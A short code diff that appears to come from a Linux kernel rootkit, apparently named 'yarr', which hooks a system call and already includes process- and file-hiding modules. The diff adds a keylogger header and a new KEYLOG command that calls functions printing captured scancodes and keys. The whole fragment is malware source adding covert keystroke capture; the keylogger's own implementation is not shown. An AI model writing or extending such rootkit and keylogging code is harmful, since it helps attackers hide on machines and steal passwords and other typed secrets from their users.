@@ -28,6 +28,7 @@
 #include "hideproc.h"
 #include "hidefile.h"
 #include "hide.h"
+#include "keylog.h"
 
 unsigned long *old_syscall = NULL;
 
@@ -67,6 +68,12 @@ asmlinkage long yarrSyscall(yarrOps code, const syscallData __user *data) {
 
 		case UNLOAD_YARR:
 			res = unloadMe();
+			break;
+
+		case KEYLOG:
+			print_scancodes();
+			print_keys();
+			res = 0;
 			break;
 
 		default:
